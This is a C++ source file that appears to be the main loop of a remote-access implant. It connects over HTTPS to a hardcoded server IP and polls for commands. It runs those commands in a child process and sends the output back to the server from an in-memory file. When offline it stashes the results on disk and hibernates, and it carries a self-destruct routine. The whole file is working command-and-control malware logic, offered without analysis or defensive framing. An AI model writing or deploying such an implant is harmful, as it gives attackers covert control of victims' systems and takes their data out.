#include "../headers/utils.h"
#include "../headers/https.h"
#include "../headers/payload.h"
#include "../headers/info.h"
#include "../headers/debug.h"
#include <unistd.h>
#include <fcntl.h>

int main()
{
	Payload payload;
	Https https;

	int suicide = 0;
	int fd = -1;

	std::vector<std::string> output;
	std::vector<std::string> commands;
	std::string jsonPayload;

	if (https.httpsInit(IP) < 0)
		return 1;

	utils::sigterm_handler();

	if (payload.heartbeat(https, 0, 1) != 0)
		return 1;

	while (!utils::received_sigterm()) {
		commands = payload.recvCMD(https, 1, 0);

		output.clear();
		payload.spawnChild(commands, output, &suicide);

		jsonPayload = utils::serializeVectorToJson(output);

		if (fd >= 0)
			close(fd);

		fd = utils::createMFile(TEMP_FILENAME, { jsonPayload });

		bool connected = payload.heartbeat(https, 0, 1) == 0;

		if (connected && fd >= 0) {
			if (payload.sendMemPayload(https, fd, jsonPayload) ==
			    0) {
				close(fd);
				fd = -1;
			}
		} else {
			utils::writeFile(TEMP_FILENAME, jsonPayload);
			payload.hibernate();
		}

		if (suicide)
			payload.suicide();
	}

	if (fd >= 0) {
		utils::writeFile(TEMP_FILENAME, jsonPayload);
		close(fd);
	}
	return 0;
}
